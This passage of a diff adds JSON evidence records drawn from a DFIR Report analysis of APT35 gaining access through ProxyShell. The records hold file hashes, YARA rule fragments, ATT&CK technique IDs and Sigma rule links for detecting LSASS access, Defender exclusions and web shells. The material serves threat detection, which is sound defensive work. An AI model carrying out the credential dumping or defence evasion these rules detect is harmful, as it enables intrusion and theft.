+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_89",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 12,
+        "section": "rule",
+        "sentence_id": "p12_r3"
+      },
+      "text": "powershell.exe (multiple commands)",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_90",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 12,
+        "section": "rule",
+        "sentence_id": "p12_r4"
+      },
+      "text": "quser.exe",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_91",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 13,
+        "section": "rule",
+        "sentence_id": "p13_r1"
+      },
+      "text": "As we saw from the execution section, dllhost.exe was used to access the below domains for C2, which we believe was using a variation of FRP.",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_94",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r3"
+      },
+      "text": "1a5ad24a6880eea807078375d6461f58",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_95",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r4"
+      },
+      "text": "da2470c3990ea0862a79149c6036388498da83cd",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_96",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r5"
+      },
+      "text": "84f77fc4281ebf94ab4897a48aa5dd7092cc0b7c78235965637eeef0908fb6c7",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_97",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r6"
+      },
+      "text": "b2fde6dc7bd1e04ce601f57805de415b",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_98",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r7"
+      },
+      "text": "4d243969b54b9b80c1d26e0801a6e7e46d2ef03e",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_99",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r8"
+      },
+      "text": "c5aae30675cc1fd83fd25330cec245af744b878a8f86626d98b8e7fcd3e970f8",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_101",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r10"
+      },
+      "text": "9a3703f9c532ae2ec3025840fa449d4e",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_102",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r11"
+      },
+      "text": "8ece87086e8b5aba0d1cc4ec3804bf74e0b45bee",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_103",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r12"
+      },
+      "text": "1604e69d17c0f26182a3e3ff65694a49450aafd56a7e8b21697a932409dfd81e",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_104",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r13"
+      },
+      "text": "5f098b55f94f5a448ca28904a57c0e58",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_105",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r14"
+      },
+      "text": "27102b416ef5df186bd8b35190c2a4cc4e2fbf37",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_106",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r15"
+      },
+      "text": "668ec78916bab79e707dc99fdecfa10f3c87ee36d4dee6e3502d1f5663a428a0",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_107",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r16"
+      },
+      "text": "d2f4647a3749d30a35d5a8faff41765e",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_108",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r17"
+      },
+      "text": "0f676bc786db3c44cac4d2d22070fb514b4cb64c",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_109",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r18"
+      },
+      "text": "559d4abe3a6f6c93fc9eae24672a49781af140c43d491a757c8e975507b4032e",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_111",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r20"
+      },
+      "text": "f0be699c8aafc41b25a8fc0974cc4582",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_112",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r21"
+      },
+      "text": "6bae2d45bbd8c4b0a59ba08892692fe86e596154",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_113",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r22"
+      },
+      "text": "7b5fbbd90eab5bee6f3c25aa3c2762104e219f96501ad6a4463e25e6001eb00b",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_114",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r23"
+      },
+      "text": "task_update.exe",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_115",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r24"
+      },
+      "text": "cacb64bdf648444e66c82f5ce61caf4b",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_116",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 14,
+        "section": "rule",
+        "sentence_id": "p14_r25"
+      },
+      "text": "3a6431169073d61748829c31a9da29123dd61da8",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_118",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 15,
+        "section": "rule",
+        "sentence_id": "p15_r1"
+      },
+      "text": "Net.exe Execution – https://github.com/SigmaHQ/sigma/blob/777d218adc789b7f1b146701793e78799324d87d/ rules/windows/process_creation/win_susp_net_execution.yml",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_122",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 19,
+        "section": "rule",
+        "sentence_id": "p19_r2"
+      },
+      "text": "meta: description = \"9893_files - file user.exe\" author = \"TheDFIRReport\" reference = \"https://thedfirreport.com/2022/03/21/apt35-automates-initial- access-using-proxyshell/\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_126",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 19,
+        "section": "rule",
+        "sentence_id": "p19_r6"
+      },
+      "text": "$s20 = \" 46B722FD25E69870FA7711924BC5304D 787242D55F2C49A23F5D97710D972108 A2DB26CE3BBE7B2CB12F9BEFB37891A3\" fullword wide",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_129",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 19,
+        "section": "rule",
+        "sentence_id": "p19_r9"
+      },
+      "text": "meta: description = \"9893_files - file task_update.exe\" author = \"TheDFIRReport\" reference = \"https://thedfirreport.com/2022/03/21/apt35-automates-initial- access-using-proxyshell/\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_132",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 20,
+        "section": "rule",
+        "sentence_id": "p20_r3"
+      },
+      "text": "$s19 = \" 11FCC18FB2B55FC3C988F6A76FCF8A2D 56D49E57AD1A051BF62C458CD6F3DEA9 6104990DFEA3DFAB044FAF960458DB09\" fullword wide",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_135",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 20,
+        "section": "rule",
+        "sentence_id": "p20_r6"
+      },
+      "text": "meta: description = \"9893_files - file App_Web_vjloy3pa.dll\" author = \"TheDFIRReport\" reference = \"https://thedfirreport.com/2022/03/21/apt35-automates-initial- access-using-proxyshell/\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_140",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 21,
+        "section": "rule",
+        "sentence_id": "p21_r5"
+      },
+      "text": "meta: description = \"9893_files - from files user.exe, task_update.exe\" author = \"TheDFIRReport\" reference = \"https://thedfirreport.com/2022/03/21/apt35-automates-initial- access-using-proxyshell/\"",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_141",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 21,
+        "section": "rule",
+        "sentence_id": "p21_r6"
+      },
+      "text": "date = \"2022-03-21\" hash1 = \"7b5fbbd90eab5bee6f3c25aa3c2762104e219f96501ad6a4463e25e6001eb00b\" hash2 = \"12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075ff6d1a\" strings: $s1 = \"-InitOnceExecuteOnce\" fullword ascii $s2 = \"PB_GadgetStack_%I64i\" fullword ascii $s3 = \"PB_DropAccept\" fullword ascii $s4 = \"PB_PostEventMessage\" fullword ascii $s5 = \"PB_WindowID\" fullword ascii $s6 = \"?GetLongPathNameA\" fullword ascii $s7 = \"Memory page error\" fullword ascii $s8 = \"PPPPPPH\" fullword ascii $s9 = \"YZAXAYH\" fullword ascii $s10 = \"%d:%I64d:%I64d:%I64d\" fullword ascii",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_142",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 22,
+        "section": "rule",
+        "sentence_id": "p22_r1"
+      },
+      "text": "Exploit Public-Facing Application – T1190 OS Credential Dumping – T1003 Account Manipulation – T1098 Valid Accounts – T1078 Ingress Tool Transfer – T1105 Match Legitimate Name or Location – T1036.005 Windows Service – T1543.003 Web Shell – T1505.003 System Information Discovery – T1082 System Network Configuration Discovery – T1016 System Owner/User Discovery – T1033 Windows Command Shell – T1059.003",
+      "language": "en",
+      "confidence": 0.98,
+      "note": "rule or indicator snippet evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_144",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 20,
+        "section": "rule_backfill",
+        "sentence_id": "p20_rb144"
+      },
+      "text": "hash1 = \"faa315db522d8ce597ac0aa957bf5bde31d91de94e68d5aefac4e3e2c11aa970\"",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_145",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 20,
+        "section": "rule_backfill",
+        "sentence_id": "p20_rb145"
+      },
+      "text": "ial- access-using-proxyshell/\" date = \"2022-03-21\" hash1 = \"faa315db522d8ce597ac0aa957bf5bde31d91de94e68d5aefac4e3e2c11aa970\" strings: $x2 = \"hSystem.ComponentModel.DataAnnotations",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_146",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 16,
+        "section": "rule_backfill",
+        "sentence_id": "p16_rb146"
+      },
+      "text": "https://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/ru",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_147",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 16,
+        "section": "rule_backfill",
+        "sentence_id": "p16_rb147"
+      },
+      "text": "uled Task Creations – https://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/ru les/windows/other/taskscheduler/win_rare_schtask_creation.yml Service Execut",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_148",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 15,
+        "section": "rule_backfill",
+        "sentence_id": "p15_rb148"
+      },
+      "text": "https://github.com/SigmaHQ/sigma/blob/1425ede905514b7dbf3c457561aaf2ff27274724/ru",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_149",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 15,
+        "section": "rule_backfill",
+        "sentence_id": "p15_rb149"
+      },
+      "text": "eractive PowerShell – https://github.com/SigmaHQ/sigma/blob/1425ede905514b7dbf3c457561aaf2ff27274724/ru les/windows/process_creation/win_non_interactive_powershell.yml Powershell D",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_150",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 16,
+        "section": "rule_backfill",
+        "sentence_id": "p16_rb150"
+      },
+      "text": "https://github.com/SigmaHQ/sigma/blob/1cfca93354d25e458db40f8d48403602b46bbf03",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_151",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 16,
+        "section": "rule_backfill",
+        "sentence_id": "p16_rb151"
+      },
+      "text": "mmand Line Keywords – https://github.com/SigmaHQ/sigma/blob/1cfca93354d25e458db40f8d48403602b46bbf03 /rules/windows/process_creation/win_webshell_detection.yml Windows Defender Rea",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_152",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 15,
+        "section": "rule_backfill",
+        "sentence_id": "p15_rb152"
+      },
+      "text": "https://github.com/SigmaHQ/sigma/blob/1ff5e226ad8bed34916c16ccc77ba281ca3203ae/ru",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_153",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 15,
+        "section": "rule_backfill",
+        "sentence_id": "p15_rb153"
+      },
+      "text": "l Get-Process LSASS – https://github.com/SigmaHQ/sigma/blob/1ff5e226ad8bed34916c16ccc77ba281ca3203ae/ru les/windows/process_creation/win_susp_powershell_getprocess_lsass.yml",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_154",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 16,
+        "section": "rule_backfill",
+        "sentence_id": "p16_rb154"
+      },
+      "text": "https://github.com/SigmaHQ/sigma/blob/503df469687fe4d14d2119a95723485d079ec0d9/",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_155",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 16,
+        "section": "rule_backfill",
+        "sentence_id": "p16_rb155"
+      },
+      "text": "UseLogonCredential – https://github.com/SigmaHQ/sigma/blob/503df469687fe4d14d2119a95723485d079ec0d9/ rules/windows/registry_event/sysmon_wdigest_enable_uselogoncredential.yml Websh",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_156",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 16,
+        "section": "rule_backfill",
+        "sentence_id": "p16_rb156"
+      },
+      "text": "https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/r",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_157",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 16,
+        "section": "rule_backfill",
+        "sentence_id": "p16_rb157"
+      },
+      "text": "Protection Disabled – https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/r ules/windows/registry_event/registry_event_defender_realtime_protection_disab",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_158",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 15,
+        "section": "rule_backfill",
+        "sentence_id": "p15_rb158"
+      },
+      "text": "https://github.com/SigmaHQ/sigma/blob/682e0458a336c3a6e93b18f7e972e1d67ef01598/r",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_159",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 15,
+        "section": "rule_backfill",
+        "sentence_id": "p15_rb159"
+      },
+      "text": "Defender Exclusion – https://github.com/SigmaHQ/sigma/blob/682e0458a336c3a6e93b18f7e972e1d67ef01598/r ules/windows/process_creation/win_powershell_defender_exclusion.yml PowerShell",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_160",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 16,
+        "section": "rule_backfill",
+        "sentence_id": "p16_rb160"
+      },
+      "text": "https://github.com/SigmaHQ/sigma/blob/6f5271275e9ac22be9ded8b9252bce064e524153/",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_161",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 16,
+        "section": "rule_backfill",
+        "sentence_id": "p16_rb161"
+      },
+      "text": "hell Parent Process – https://github.com/SigmaHQ/sigma/blob/6f5271275e9ac22be9ded8b9252bce064e524153/ rules/windows/process_creation/win_susp_powershell_parent_process.yml Suspicio",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_162",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 17,
+        "section": "rule_backfill",
+        "sentence_id": "p17_rb162"
+      },
+      "text": "https://github.com/SigmaHQ/sigma/blob/98d7380a40d503ffd225420f7318b79d9f5097b8",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_163",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 17,
+        "section": "rule_backfill",
+        "sentence_id": "p17_rb163"
+      },
+      "text": "uest in CommandLine – https://github.com/SigmaHQ/sigma/blob/98d7380a40d503ffd225420f7318b79d9f5097b8 /rules/windows/process_creation/process_creation_susp_web_request_cmd.yml Windo",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_164",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 15,
+        "section": "rule_backfill",
+        "sentence_id": "p15_rb164"
+      },
+      "text": "https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_165",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 16,
+        "section": "rule_backfill",
+        "sentence_id": "p16_rb165"
+      },
+      "text": "https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_166",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 17,
+        "section": "rule_backfill",
+        "sentence_id": "p17_rb166"
+      },
+      "text": "https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_167",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 15,
+        "section": "rule_backfill",
+        "sentence_id": "p15_rb167"
+      },
+      "text": "Accounts Discovery – https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/ rules/windows/process_creation/win_local_system_owner_account_discovery.yml Lsa",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_168",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 15,
+        "section": "rule_backfill",
+        "sentence_id": "p15_rb168"
+      },
+      "text": "https://github.com/SigmaHQ/sigma/blob/b81839e3ce507df925d6e583e569e1ac3a3894ab/",
+      "language": "en",
+      "confidence": 0.97,
+      "note": "supplemental exact-match evidence",
+      "source": "document"
+    },
+    {
+      "id": "ev_169",
+      "evidence_type": "report_text",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "locator": {
+        "page": 15,
+        "section": "rule_backfill",
+        "sentence_id": "p15_rb169"
+      },
